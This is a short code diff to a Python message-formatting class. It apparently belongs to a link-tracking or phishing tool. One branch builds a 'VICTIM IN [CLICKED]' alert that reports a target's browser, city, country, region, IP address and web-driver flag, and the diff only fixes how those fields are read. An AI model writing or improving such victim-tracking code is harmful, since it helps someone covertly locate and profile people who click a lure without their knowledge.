@@ -35,12 +35,12 @@ class MessageGateWay:
             case 'click':
                 return (
                     f"📱 *VICTIM IN [CLICKED]:* \n\n"
-                    f"🌐 *BROWSER:* `{self.data.get('click').USER_AGENT}`\n\n"
-                    f"📍 *CITY:* `{self.data.get('click').CITY}`\n\n"
-                    f"📍 *COUNTRY:* `{self.data.get('click').COUNTRY}`\n\n"
-                    f"📍 *REGION:* `{self.data.get('click').REGION}`\n\n"
-                    f"📡 *IP ADDRESS:* `{self.data.get('click').IP}`"
-                    f"🤖 *WEB DRIVER:* `{self.data.get('click').WEB_DRIVER}`"
+                    f"🌐 *BROWSER:* `{self.data.get('click')['USER_AGENT']}`\n\n"
+                    f"📍 *CITY:* `{self.data.get('click')['CITY']}`\n\n"
+                    f"📍 *COUNTRY:* `{self.data.get('click')['COUNTRY']}`\n\n"
+                    f"📍 *REGION:* `{self.data.get('click')['REGION']}`\n\n"
+                    f"📡 *IP ADDRESS:* `{self.data.get('click')['IP']}`\n\n"
+                    f"🤖 *WEB DRIVER:* `{self.data.get('click')['WEB_DRIVER']}`"
                 )
             case _:
                 return "Unknown message type"
